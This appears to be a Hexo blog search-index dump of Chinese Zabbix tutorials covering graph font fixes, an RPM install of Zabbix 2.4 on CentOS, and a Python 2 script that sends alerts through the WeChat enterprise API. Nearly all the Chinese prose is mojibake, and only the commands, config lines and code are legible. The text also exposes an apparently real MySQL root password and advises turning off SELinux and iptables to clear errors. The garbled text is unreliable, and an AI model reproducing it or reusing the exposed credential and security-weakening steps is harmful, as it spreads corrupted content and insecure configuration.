å®‰è£…åŒ…ä¸‹è½½åœ°å€ï¼šä¸­æ–‡æ±‰åŒ–ä¹±ç åŒ… 123456789101112131415* å‚è€ƒæ–‡æ¡£ï¼šzabbixç‰ˆæœ¬éƒ½å·²æœ‰æ±‰åŒ–åŠŸèƒ½äº†ï¼Œç›´æ¥é€‰æ‹©ä¸­æ–‡å°±è¡Œã€‚å¯æ˜¯ä½ç‰ˆæœ¬çš„å°±éœ€è¦å®‰è£…æ±‰åŒ–ï¼Œå¯æ˜¯å‘ç°æ‰“å¼€å›¾å½¢ç•Œé¢æ˜¯ç©ºç™½å›¾å½¢ï¼šé‡åˆ°ä¸­æ–‡ä¹±ç é—®é¢˜ã€‚zabbixä¹±ç æ˜¯æ€ä¹ˆç…§æˆçš„å‘¢ï¼Ÿzabbixä½¿ç”¨DejaVuSan.ttfå­—ä½“ï¼Œä¸æ”¯æŒä¸­æ–‡ï¼Œå¯¼è‡´ä¸­æ–‡å‡ºç°ä¹±ç ã€‚è§£å†³æ–¹æ³•å¾ˆç®€å•ï¼ŒæŠŠæˆ‘ä»¬ç”µè„‘é‡Œé¢å­—ä½“æ–‡ä»¶ä¼ åˆ°zabbixæœåŠ¡å™¨ä¸Šã€‚* åœ¨zabbix-serverç«¯ä¸Šé¢è¿›å…¥å®‰è£…ç›®å½•ï¼švar/www/html/zabbix/fontsç›®å½•ä¸‹é¢æŸ¥çœ‹ï¼Œå‘ç°ä¹‹å‰ä¸Šä¼ å­—ä½“çš„æ–‡ä»¶ååç¼€æ˜¯.ttcï¼ŒçŒœç€ä¸€èˆ¬è§åˆ°çš„éƒ½åç¼€éƒ½æ˜¯ttfçš„ï¼Œä¼šä¸ä¼šæ˜¯è¿™ä¸ªé—®é¢˜å¯¼è‡´çš„å‘¢ã€‚äºæ˜¯åœ¨windowsç³»ç»Ÿä¸Šæ‰¾åˆ°simkai.ttf,ä¸Šä¼ åˆ°fontsä¸‹ï¼Œç¼–è¾‘/var/www/html/zabbix/include/defines.inc.phpï¼Œæ›´æ”¹ä¸¤å¤„åœ°æ–¹ï¼š define(â€˜ZBX_FONT_NAMEâ€˜, â€˜simkaiâ€˜); define(â€˜ZBX_GRAPH_FONT_NAMEâ€˜, â€˜simkaiâ€˜);fzytk è®¾ç½®å¥½äº†ï¼ŒæœåŠ¡é‡å¯ä¸‹ï¼Œåˆ·æ–°ï¼Œå›¾ä¸‹é¢å°±æœ‰å­—ä½“äº†ï¼š graphfont å¸¸è§é—®é¢˜ï¼š 123456789ä¾æ—§ä¹±ç ï¼šé€šè¿‡ä»¥ä¸Šçš„æ“ä½œï¼Œå¤§éƒ¨åˆ†åŒå­¦çš„ä¹±ç é—®é¢˜è§£å†³äº†ï¼Œä½†æ˜¯ä¾æ—§æœ‰ä¸€äº›åŒå­¦è¿˜æ˜¯ä¹±ç ï¼Ÿç»†å¿ƒçš„ç¾¤å‹æä¾›å¦å¤–ä¸€ç§æƒ…å†µï¼šåˆå§‹åŒ–æ•°æ®åº“çš„æ—¶å€™æœªä½¿ç”¨utf8ç¼–ç æ‰€è‡´.åˆå§‹åŒ–æ•°æ®åº“ä½¿ç”¨å‘½ä»¤create database zabbix default charset utf8;æˆ–è€…my.cnfå¢åŠ å¦‚ä¸‹é…ç½®default-character-set = utf8æ€»ç»“ ä¹±ç å¤„ç†æ–¹æ³•å¾ˆç®€å•ï¼Œå®é™…ä¸Šå°±æ˜¯æ›¿æ¢å­—ä½“ã€‚ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2014/10/04/æ€§èƒ½ç›‘æ§/Zabbix/zabbix-æ•…éšœæ€»ç»“/"},{"title":"zabbix2.4æœåŠ¡ç«¯rpmå¿«é€Ÿå®‰è£…éƒ¨ç½²","text":"ç³»ç»Ÿç¯å¢ƒï¼š 192.168.1.170 MySQLä¸» 192.168.1.183 zabbix-server Zabbix å¿«é€Ÿéƒ¨ç½²ï¼ˆRPMï¼‰æ³¨é‡Šï¼šå®‰è£…ç¯å¢ƒä¸ºç³»ç»Ÿæœ€å°å®‰è£…ï¼Œæ³¨æ„æ—¶é—´åŒæ­¥ 12[root@docker ~]# cat /etc/redhat-releaseCentOS Linux release 7.2.1511 (Core) å…³é—­SELinuxï¼š1ã€ä¸´æ—¶å…³é—­ï¼ˆä¸ç”¨é‡å¯æœºå™¨ï¼‰ï¼š #setenforce 0 ##è®¾ç½®SELinux æˆä¸ºpermissiveæ¨¡å¼ #setenforce 1 ##è®¾ç½®SELinux æˆä¸ºenforcingæ¨¡å¼ 1.é…ç½®å®˜æ–¹yumï¼š cnetos 32ä½ï¼š#rpm -ivh http://repo.zabbix.com/zabbix/2.4/rhel/6/i386/zabbix-release-2.4-1.el6.noarch.rpm cnetos 64ä½ï¼š#rpm -ivh http://repo.zabbix.com/zabbix/2.4/rhel/6/x86_64/zabbix-release-2.4-1.el6.noarch.rpm centos7 64ä½ï¼š# rpm -ivh http://repo.zabbix.com/zabbix/2.4/rhel/7/x86_64/zabbix-release-2.4-1.el7.noarch.rpm å¦‚æœé€‰æ‹©è¿™ä¸ªæ–¹å¼æ˜¯å®‰è£…æœ€é«˜çš„2.4.8ç‰ˆæœ¬ 2.å®‰è£…Zabbixï¼š12#yum -y install zabbix-server-mysql zabbix-web-mysql zabbix-agent mysql-server mysql #å®‰è£…ç›¸å…³è½¯ä»¶åŒ…#yum -y install zabbix-get zabbix-sender #æ–¹ä¾¿ä»¥åå¯¹zabbixè°ƒè¯•ç”¨ 3.é…ç½®æ•°æ®åº“ ç™»é™†åˆ°192.168.1.170æœåŠ¡å™¨ä¸Šé¢ï¼š 12# mysql -e \"create database zabbix character set utf8 collate utf8_bin;\" #ä¿®æ”¹æ—¶åŒº# mysql -e \"grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';\" #åˆ›å»ºæ•°æ®åº“å è¿™é‡Œæˆ‘è®¾ç½®äº†åªèƒ½192.168.1.0ç½‘æ®µå¯ä»¥è®¿é—®æ•°æ®åº“ã€‚ æ‰€ä»¥è¿™é‡Œåˆ›å»ºæ•°æ®åº“ç›´æ¥è¿™ä¹ˆæ“ä½œäº†ã€‚ 1234567891011121314151617181920 [root@mysql ~]# mysql -uroot -pIhaozhuo_b313 -h 192.168.1.170Warning: Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 10Server version: 5.6.20-log MySQL Community Server (GPL)Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; create database zabbix character set utf8 collate utf8_bin;Query OK, 1 row affected (0.06 sec)mysql&gt; GRANT ALL ON zabbix.* TO 'zabbix'@'192.168.1.%' IDENTIFIED BY 'zabbix123.com';Query OK, 0 rows affected (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) 4.å¯¼å…¥æ•°æ®åº“æ–‡ä»¶ï¼š 1cd /usr/share/doc/zabbix-server-mysql-2.4.8/create æ“ä½œä¸‰æ¡å‘½ä»¤æŠŠæ•°æ®å¯¼å…¥åˆ°åœ¨æŒ‡å®šçš„MySQLï¼šzabbix 123mysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; schema.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; images.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; data.sql 4. ä¿®æ”¹zabbix_server.conf æ–‡ä»¶vim /etc/zabbix/zabbix_server.conf 1234567# ListenPort=10051 //ç›‘å¬çš„ç«¯å£# LogFile=/var/log/zabbix/zabbix_server.log //æ—¥å¿—æ–‡ä»¶è·¯å¾„# LogFileSize=0 //æ—¥å¿—æ–‡ä»¶æ»šåŠ¨ï¼Œåˆ†å‰²ã€‚ï¼ˆå‚æ•°ä¸ºâ€œ0â€ï¼Œä¸åšæ»šåŠ¨ï¼‰ï¼Œä¾‹å¦‚å½“æ—¥å¿—æ–‡ä»¶åˆ°è¾¾1Gï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸ªæ–°çš„æ—¥å¿—æ–‡ä»¶ï¼Œå®Œæˆæ—¥å¿—æ»šåŠ¨ã€‚DBName=zabbix DBUser=zabbix #æ•°æ®åº“ç”¨æˆ·åDBPassword=zabbix123.com #æ•°æ®åº“å¯†ç AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts#zabbixè¿è¡Œè„šæœ¬å­˜æ”¾ç›®å½• :wq! #ä¿å­˜é€€å‡º 12345678910111213#cp /etc/zabbix/zabbix_server.conf &#123;,.bak&#125; #å¤‡ä»½ln -s /etc/alternatives/zabbix-server /usr/bin/zabbix-servercp /usr/sbin/zabbix_agentd /etc/init.d/zabbix_agentd[root@docker alternatives]# cp /etc/alternatives/zabbix_server /etc/init.d/zabbix-serverchmod +x /etc/rc.d/init.d/zabbix_server #æ·»åŠ è„šæœ¬æ‰§è¡Œæƒé™chmod +x /etc/rc.d/init.d/zabbix_agentd #æ·»åŠ è„šæœ¬æ‰§è¡Œæƒé™vim /etc/php.inidate.timezone = Asia/Shanghaipost_max_size = 32Mmax_execution_time = 300max_input_time = 300 5. ä¿®æ”¹zabbixå¼€æœºå¯åŠ¨è„šæœ¬ä¸­çš„zabbixå®‰è£…ç›®å½•123456vi /etc/rc.d/init.d/zabbix_server #ç¼–è¾‘æœåŠ¡ç«¯é…ç½®æ–‡ä»¶BASEDIR=/usr/local/zabbix/ #zabbixå®‰è£…ç›®å½•# /etc/init.d/zabbix-server start# /etc/init.d/zabbix_agentd start#/etc/init.d/httpd start 6.1 æ·»åŠ å¼€æœºå¯åŠ¨æœåŠ¡1234chkconfig --add zabbix-server chkconfig --add zabbix-agent chkconfig --add httpd chkconfig --add mysqld 6.2 æ·»åŠ å¼€æœºå¯åŠ¨1234chkconfig zabbix-server on chkconfig zabbix-agent on chkconfig httpd on chkconfig mysqld on 6.3 æ·»åŠ é˜²ç«å¢™123-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 10051 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 10050 -j ACCEPT 7.åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ï¼šhttp://192.168.1.183/zabbix/è¿›å…¥è®¾ç½®ç•Œé¢ è¿›å…¥ï¼š â€œ/var/www/html/zabbix/conf/zabbix.conf.phpâ€ å¤‡ä»½ï¼š cp zabbix.conf.php.example zabbix.conf.phpä¸‹è½½ä¸‹æ¥çš„æ”¾åˆ°è¿™ä¸ªç›®å½•ä¸‹é¢ã€‚ ç”¨æˆ·å:Admin å¯†ç ï¼šzabbix è®¾ç½®ä¸­æ–‡ç‰ˆæœ¬ï¼Œ2.4ç‰ˆæœ¬ä»¥åéƒ½æ”¯æ’‘ä¸­æ–‡ç‰ˆæœ¬ï¼Œ2.2.0ç‰ˆæœ¬éƒ½æ˜¯ä¸æ”¯æŒçš„ï¼Œéœ€è¦ä¸‹è½½ä¸­æ–‡ç‰ˆæœ¬åŒ…ï¼Œæ”¾åˆ°zabbixç›®å½•ä¸‹é¢ã€‚ è®¾ç½®èƒŒæ™¯ä¸ºç»å…¸çš„æ˜¯ä¸æ˜¯çœ‹ç€ä¼šèˆ’æœç‚¹ï¼š3.0 å¯¹å¤–è§‚æ”¹çš„æ”¹åŠ¨å¾ˆå¤§ï¼Œæ”¯æ’‘ç¡¬ä»¶ç›‘æ§åŠŸèƒ½åŠ å¼ºã€‚ ç®€å•çš„å®‰è£…å°±å·²ç»æå®šäº†ã€‚ å®‰è£…å‡ºç°å‡ ç§é”™è¯¯æƒ…å†µï¼šç™»é™†zabbixæç¤ºzabbix server is not running:the information displayedmay not be current è§£å†³æ–¹æ³•ï¼š 12å…³é—­selinuxä¸iptablesvim /var/www/html/zabbix/conf/zabbix.conf.phpå°†zabbix.conf.phpé‡Œçš„serverå†™æˆipåœ°å€ï¼Œå°±è§£å†³äº† æŸ¥çœ‹æ—¥å¿—ï¼š 126576:20160719:045354.989 [Z3001] connection to database 'zabbix' failed: [2002] Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2) è¿™ä¸ªæŠ¥é”™çš„è¯ï¼Œå°±è¯´æ˜é…ç½®æ–‡ä»¶æœ‰é—®é¢˜ï¼š è®¾ç½®æ•°æ®åº“è®¿é—®åœ°å€ï¼šDBHost=192.168.1.170 ç„¶åvi zabbix.conf.phpè®°å¾—ä¿®æ”¹ï¼š 123$ZBX_SERVER = 'ZABBIX_SERVER_IP'; IPåœ°å€$ZBX_SERVER_PORT = '10051'; ç„¶åé‡å¯ä¸‹æœåŠ¡ï¼Œå°±ä¸ä¼šå‡ºç°MySQLæœ¬åœ°æ— æ³•è¿æ¥ã€‚ å¦‚æœæŠ¥é”™ï¼š 16664:20160719:050257.665 cannot send list of active checks to [127.0.0.1]: host [Zabbix server] not monitored ç¡®ä¿zabbixå‰å°ä¸Šçš„Host nameä¸ä¸»æœºçš„hostnameä¸€è‡´å³å¯ã€‚ è¿™æ˜¯å¿«é€Ÿç®€å•å®‰è£…2.4.8ç‰ˆæœ¬çš„ï¼Œåé¢è¿˜æœ‰ç¼–è¯‘å®‰è£…çš„ï¼Œç¼–è¯‘å®‰è£…çš„å¥½å¤„ï¼Œå¯ä»¥äº†è§£å®‰è£…çš„è·¯å¾„å’Œé…ç½®æ–‡ä»¶éƒ½æ˜¯è‡ªå·±ç†Ÿæ‚‰çš„ã€‚ 2.4.8æœåŠ¡ç«¯ç¼–è¯‘å®‰è£…ä¸éƒ¨ç½²ï¼š 2.4.8å‡çº§3.0å®‰è£…ä¸éƒ¨ç½²ï¼š 3.0å®‰è£…ä¸éƒ¨ç½²ï¼š å®‰è£…å®Œæˆä»¥åå‡ºç°å›¾åƒä¹±ç ï¼š https://github.com/yangcvo/zabbix.2.4 2.4.8ç‰ˆæœ¬zabbix-serveræœåŠ¡ç«¯ç¼–è¯‘å®‰è£…ï¼šæºç ç¼–è¯‘å®‰è£…éƒ¨ç½²2.4.8ç‰ˆæœ¬zabbix-serveræœåŠ¡ç«¯","link":"/2014/10/03/æ€§èƒ½ç›‘æ§/Zabbix/zabbix2.4æœåŠ¡ç«¯yum-rpmå¿«é€Ÿå®‰è£…éƒ¨ç½²/"},{"title":"zabbix3.0å®ç°å¾®ä¿¡æŠ¥è­¦","text":"å‰è¨€ï¼š å› ä¸ºæˆ‘å·²ç»åœ¨æµ‹è¯•ç¯å¢ƒå’ŒÂ·ç”Ÿäº§ç¯å¢ƒÂ·éƒ½å®ç°äº†å¾®ä¿¡å’Œé‚®ä»¶å‘Šè­¦ã€‚ä»Šå¤©æœ‰ç©ºå°±å†™äº†ç¯‡æ–‡æ¡£åæœŸå¯ä»¥åœ¨å¤ä¹ ä¸‹ï¼Œç°å®ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨é‚®ä»¶å’ŒçŸ­ä¿¡æ¥å—zabbixæŠ¥è­¦ä¿¡æ¯ï¼Œä½†æ˜¯é‚®ä»¶ç»å¸¸è¢«å·¥ä½œäººå‘˜æç½®åœ¨è§’è½ä¸­ç”šè‡³è¢«è®¾ç½®ä¸ºåƒåœ¾é‚®ä»¶è¢«è¿‡æ»¤æ‰ã€‚å…¬å¸çš„çŸ­ä¿¡æ¥å£åˆå¤ªè´µï¼Œå¤æ‚ç¯å¢ƒä¸­ä½¿ç”¨çŸ­æ¯æŠ¥è­¦ä¼šä½¿è¿ç»´æˆæœ¬å¢åŠ å¾ˆå¤šã€‚å¾®ä¿¡æä¾›äº†å¾ˆå¥½çš„ç¬¬ä¸‰æ–¹æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¾®ä¿¡æŠ¥è­¦ä»¥æ±‚é™ä½è¿ç»´æˆæœ¬ã€‚ è¿™é‡Œæˆ‘ç°åœ¨å…¬å¸ä¹Ÿç”¨ç¬¬ä¸‰æ–¹çš„ç”µè¯çŸ­ä¿¡çŒ«åšå‘Šè­¦ï¼Œä¸¥é‡çš„æ•…éšœä¼šç”¨çŸ­ä¿¡æ¥å‘é€åˆ°æŒ‡å®šçš„è¿ç»´äººå‘˜ã€‚è¿™æ ·å³ä½¿å¾®ä¿¡å’Œé‚®ä»¶éƒ½æ²¡æœ‰æ‰“å¼€æ”¶åˆ°ï¼ŒçŸ­ä¿¡å’Œç”µè¯ä¼šç¬¬ä¸€æ—¶é—´é€šçŸ¥ã€‚ å¾®ä¿¡å‘Šè­¦çš„å¥½å¤„ï¼šç¬¬ä¸€ï¼šå¯ä»¥åŠæ—¶é€šçŸ¥æ—¶é—´é€šçŸ¥è¿ç»´äººå‘˜ã€‚åŠæ—¶çš„è§£å†³æ•…éšœã€‚ ç¬¬äºŒï¼šä¸‹ç­å‘¨æœ«è¯¾ä½™æ—¶é—´å¯ä»¥å‡†æ—¶æ¥æ”¶åˆ°ã€‚ å®‰è£…ä¸é…ç½®ï¼šå¾®ä¿¡çš„ç¬¬ä¸‰æ–¹æ¥å£è¦æ±‚æˆ‘ä»¬å…ˆç”³è¯·ä¸€ä¸ªä¼ä¸šå·â€”â€”ä¼ é€é—¨ï¼šå¾®ä¿¡ä¼ä¸šå…¬ä¼—å·å¹³å° ç¬¬ä¸€æ­¥ï¼šç”³è¯·å¾®ä¿¡å…¬ä¼—å· è¿™é‡Œè·Ÿå¾®ä¿¡ç»‘å®šåæœŸç™»é™†åªéœ€è¦æ‰«æä¸‹äºŒç»´ç å°±å¯ä»¥äº†ã€‚ å¦‚ä½•ç”³è¯·ä¹Ÿå¯å‚è€ƒè¿™ç¯‡æ–‡æ¡£ï¼šç”³è¯·å¾®ä¿¡å…¬ä¼—å· å¦‚ä½•æ“ä½œä¼ä¸šå·ï¼Ÿ1.é€šè®¯å½•æ·»åŠ ä¼ä¸šæˆå‘˜ æˆ‘ä»¬è¦æå‰æŠŠæˆå‘˜ä¿¡æ¯æ·»åŠ è¿›ç»„ç»‡éƒ¨é—¨ï¼Œå¿…å¡«é¡¹+æ‰‹æœºå·æˆ–è€…å¾®ä¿¡å·ï¼Œè¿™æ ·åˆ«äººæ‰«æäºŒç»´ç çš„æ—¶å€™æ‰èƒ½æˆåŠŸå…³æ³¨ä¼ä¸šå·ã€‚æ³¨æ„ï¼šè¿™é‡Œæœ‰ä¸¤ä¸ªæˆ‘ä»¬è¦ç”¨åˆ°ä¿¡æ¯ï¼Œä¸€ä¸ªç»„ç»‡éƒ¨é—¨çš„IDï¼Œä¸€ä¸ªéƒ¨é—¨æˆå‘˜çš„è´¦å·ï¼ˆè´¦å·æ˜¯è‡ªå·±æ‰‹åŠ¨æŒ‡å®šçš„ï¼Œä¸åŒäºå¾®ä¿¡å·ï¼Œæœ€å¥½æ˜¯å­—æ¯åŠ æ•°å­—ï¼‰ 2.åº”ç”¨ä¸­å¿ƒåˆ›å»ºåº”ç”¨ æˆ‘ä»¬è¦åœ¨è¿™é‡Œåˆ›å»ºåº”ç”¨ï¼Œå› ä¸ºè¦é€šè¿‡åº”ç”¨å‘é€æ¶ˆæ¯ç»™éƒ¨é—¨æˆå‘˜ æ³¨æ„ï¼šè¿™é‡Œè¦è®°ä½ä¸€ä¸ªå€¼ï¼Œåº”ç”¨ID 3.ç»™éƒ¨é—¨è®¾ç½®ç®¡ç†å‘˜ è®¾ç½®---&gt;åŠŸèƒ½è®¾ç½®----&gt;æƒé™ç®¡ç†----&gt;æ–°å»ºç®¡ç†ç»„ ç®¡ç†å‘˜å¿…é¡»äº‹å…ˆå·²ç»å…³æ³¨äº†ä¼ä¸šå·ï¼Œå¹¶ä¸”å·²ç»è®¾ç½®å¥½é‚®ç®±åœ°å€ ç¡®å®šç®¡ç†å‘˜å¯ä»¥è¯»å–é€šè®¯å½•ï¼Œå¯ä»¥ä½¿ç”¨åº”ç”¨å‘æ¶ˆæ¯ã€‚ æ³¨æ„ï¼šæˆ‘ä»¬éœ€è¦ç®¡ç†å‘˜çš„CorpIDå’ŒSecret æˆ‘ä»¬è¦å‡†å¤‡è¿™äº›ä¸œè¥¿ï¼š ä¸€ä¸ªå¾®ä¿¡ä¼ä¸šå· ä¼ä¸šå·å·²ç»è¢«éƒ¨é—¨æˆå‘˜å…³æ³¨ ä¼ä¸šå·é‡Œæœ‰ä¸€ä¸ªå¯ä»¥å‘æ¶ˆæ¯çš„åº”ç”¨ ä¸€ä¸ªæˆæƒç®¡ç†å‘˜ï¼Œå¯ä»¥ä½¿ç”¨è¯¥åº”ç”¨ç»™æˆå‘˜å‘æ¶ˆæ¯ æˆ‘ä»¬è¦å–åˆ°è¿™äº›ä¿¡æ¯ï¼š æˆå‘˜è´¦å· ç»„ç»‡éƒ¨é—¨ID åº”ç”¨ID CropID Secret å¦‚ä½•è°ƒç”¨å¾®ä¿¡æ¥å£ï¼Ÿ è°ƒç”¨å¾®ä¿¡æ¥å£éœ€è¦ä¸€ä¸ªè°ƒç”¨æ¥å£çš„å‡­è¯ï¼šaccess_token é€šè¿‡ ï¼šCropID ã€Secret æ‰èƒ½è·å–åˆ°access_tokenï¼Œä½†æ˜¯è·å–åˆ°çš„tokenæœ‰æ•ˆæœŸä¸ºä¸¤åˆ†é’Ÿ å¾®ä¿¡ä¼ä¸šå·æ¥å£è°ƒè¯•å·¥å…·ä¼ é€é—¨ï¼šhttp://qydev.weixin.qq.com/debug æµ‹è¯•æ˜¯å¦å¯é€šï¼š ä½¿ç”¨ï¼š curl -s -G url è·å– AccessToke ä½¿ç”¨ï¼š curl --data url ä¼ é€å‡­è¯è°ƒç”¨ä¼ä¸šå·æ¥å£ è¿™é‡Œå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼š curl -s -G url è·å– AccessTokeæ—¶å€™ä¸ºä»€ä¹ˆæˆ‘åœ¨ç”¨ä¼ä¸šå·å‘é€æ¶ˆæ¯çš„æ—¶å€™æ€»æ˜¯è¿”å›{&quot;errcode&quot;:41004,&quot;errmsg&quot;:&quot;corpsecret missingâ€}å‘¢ï¼Ÿ ä¸»è¦åŸå› ï¼š 123â€œ41004â€è¯´æ˜ï¼šç¼ºå°‘secretå‚æ•°ï¼Œè¯·æ’æŸ¥ç›¸å…³é—®é¢˜ã€‚ç”¨â€œâ€æŠŠurlæ‹¬èµ·æ¥å°±OKï¼Œå³curl -s -G \"url\"ï¼Œä¼°è®¡ä½ å·²ç»è§£å†³äº†ï¼Œå¸®åŠ©åæ¥è€…å§ã€‚ è¿™ä¸ªé—®é¢˜å¾ˆæ£˜æ‰‹ï¼Œä¸€å¼€å§‹å¼„æäº†ä¸€ä¸ªåŠä¸ªå°æ—¶åé¢çœ‹åˆ°ä¸€ç¯‡è¿‡æ¥äººçš„æ–‡ç« å¸®åŠ©äº†æˆ‘ï¼šè¿™é‡Œæˆ‘ä¹Ÿè´´å‡ºæ¥äº†ã€‚å‚è€ƒæ–‡æ¡£ pythonè„šæœ¬åŸç† ä½¿ç”¨ï¼š self.__corpid = corpid ä½¿ç”¨ï¼š self.__secret = secret ä¼ é€å‡­è¯è°ƒç”¨ä¼ä¸šå·æ¥å£ è„šæœ¬å·²è´´å‡ºæ¥äº†ï¼Œå¯ä»¥ä¸‹è½½ weixin.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990**#!/usr/bin/env python# -*- coding: utf-8 -*-import urllib,urllib2,jsonimport sysimport loggingreload(sys)sys.setdefaultencoding( \"utf-8\" )class WeChat(object): __token_id = '' # init attribute def __init__(self,url): self.__url = url.rstrip('/') self.__corpid = 'xxx' self.__secret = 'xxx' # Get TokenID def authID(self): params = &#123;'corpid':self.__corpid, 'corpsecret':self.__secret&#125; data = urllib.urlencode(params) content = self.getToken(data) try: self.__token_id = content['access_token'] # print content['access_token'] except KeyError: raise KeyError # Establish a connection def getToken(self,data,url_prefix='/'): url = self.__url + url_prefix + 'gettoken?' try: response = urllib2.Request(url + data) except KeyError: raise KeyError result = urllib2.urlopen(response) content = json.loads(result.read()) return content # Get sendmessage url def postData(self,data,url_prefix='/'): url = self.__url + url_prefix + 'message/send?access_token=%s' % self.__token_id request = urllib2.Request(url,data) try: result = urllib2.urlopen(request) except urllib2.HTTPError as e: if hasattr(e,'reason'): print 'reason',e.reason elif hasattr(e,'code'): print 'code',e.code return 0 else: content = json.loads(result.read()) result.close() return content # send message def sendMessage(self,touser,message): self.authID() data = json.dumps(&#123; 'touser':touser, 'toparty':\"3\", 'msgtype':\"text\", 'agentid':\"3\", 'text':&#123; 'content':message &#125;, 'safe':\"0\" &#125;,ensure_ascii=False) response = self.postData(data) log_file = \"/home/zabbix/weixin.log\" logging.basicConfig(filename=log_file,filemode='a',level=logging.DEBUG) logging.info(data) logging.debug(response) print responseif __name__ == '__main__': if len(sys.argv) != 4: print 'error segments, now exit' sys.exit() a = WeChat('https://qyapi.weixin.qq.com/cgi-bin') a.sendMessage(sys.argv[1],sys.argv[3]) log_file = &quot;/home/zabbix/weixin.log&quot; å¾®ä¿¡æ—¥å¿— &apos;toparty&apos;:&quot;3&quot;, &apos;agentid&apos;:&quot;3&quot;, è¿™é‡Œ3 æ˜¯æˆ‘è¿™è¾¹åº”ç”¨ID 3 touserå¦æˆå‘˜IDåˆ—è¡¨ï¼ˆæ¶ˆæ¯æ¥æ”¶è€…ï¼Œå¤šä¸ªæ¥æ”¶è€…ç”¨â€˜|â€™åˆ†éš”ï¼Œæœ€å¤šæ”¯æŒ1000ä¸ªï¼‰ã€‚ç‰¹æ®Šæƒ…å†µï¼šæŒ‡å®šä¸º@allï¼Œåˆ™å‘å…³æ³¨è¯¥ä¼ä¸šåº”ç”¨çš„å…¨éƒ¨æˆå‘˜å‘é€ topartyå¦éƒ¨é—¨IDåˆ—è¡¨ï¼Œå¤šä¸ªæ¥æ”¶è€…ç”¨â€˜|â€™åˆ†éš”ï¼Œæœ€å¤šæ”¯æŒ100ä¸ªã€‚å½“touserä¸º@allæ—¶å¿½ç•¥æœ¬å‚æ•° totagå¦æ ‡ç­¾IDåˆ—è¡¨ï¼Œå¤šä¸ªæ¥æ”¶è€…ç”¨â€˜|â€™åˆ†éš”ã€‚å½“touserä¸º@allæ—¶å¿½ç•¥æœ¬å‚æ•° msgtypeæ˜¯æ¶ˆæ¯ç±»å‹ï¼Œæ­¤æ—¶å›ºå®šä¸ºï¼štext agentidæ˜¯ä¼ä¸šåº”ç”¨çš„idï¼Œæ•´å‹ã€‚å¯åœ¨åº”ç”¨çš„è®¾ç½®é¡µé¢æŸ¥çœ‹ contentæ˜¯æ¶ˆæ¯å†…å®¹ safeå¦è¡¨ç¤ºæ˜¯å¦æ˜¯ä¿å¯†æ¶ˆæ¯ï¼Œ0è¡¨ç¤ºå¦ï¼Œ1è¡¨ç¤ºæ˜¯ï¼Œé»˜è®¤0 &quot;touser&quot;:&quot;touser&quot;, #ä¼ä¸šå·ä¸­çš„ç”¨æˆ·å¸å·ï¼Œåœ¨zabbixç”¨æˆ·Mediaä¸­é…ç½®ï¼Œå¦‚æœé…ç½®ä¸æ­£å¸¸ï¼Œå°†æŒ‰éƒ¨é—¨å‘é€ã€‚ æ–‡ä¸­ä½¿ç”¨çš„ç”¨æˆ·, toparty éƒ¨é—¨iDä¸º3ï¼Œagentid åº”ç”¨IDä¸º3. ä¸ºä»€ä¹ˆè¦è¿™æ ·å†™è„šæœ¬ï¼Ÿå› ä¸ºå¾®ä¿¡ä¼ä¸šå·å¼€æ”¾çš„ç«¯å£æœ‰å›ºå®šçš„æ ¼å¼é™åˆ¶ ä¼ä¸šå·æ”¯æŒçš„æ ¼å¼ï¼šhttp://qydev.weixin.qq.com/wiki/index.php?title=æ¶ˆæ¯ç±»å‹åŠæ•°æ®æ ¼å¼ å°†è„šæœ¬æ”¾å…¥zabbixé»˜è®¤æ‰§è¡Œè·¯å¾„ä¸‹ mv weixin.sh /usr/local/zabbix/share/zabbix/alertscripts chown zabbix.zabbix /usr/local/zabbix/share/zabbix/alertscripts/weixin.py chmod +x /usr/local/zabbix/share/zabbix/alertscripts/weixin.py åˆ°è¿™é‡Œä¸Šé¢åŸºæœ¬çš„å·²ç»é…ç½®å®Œæ¯•äº†ã€‚ æµ‹è¯•è„šæœ¬æ˜¯å¦å¯ä»¥å‘é€æˆåŠŸæ¶ˆæ¯12[root@salt alertscripts]# python weixin.py test world!&#123;u'errcode': 60011, u'errmsg': u'no privilege to access/modify contact/party/agent '&#125; å‡ºç°æˆ‘æ˜¯ä¼ä¸šå·ä½“éªŒè´¦æˆ· æˆ‘å‘é€æ¶ˆæ¯ï¼šå¾®ä¿¡é”™è¯¯ errcode=60011. å¯å‚è€ƒï¼šå¾®ä¿¡é”™è¯¯ errcode=60011 æˆ‘è¿™é‡Œçš„åŸå› 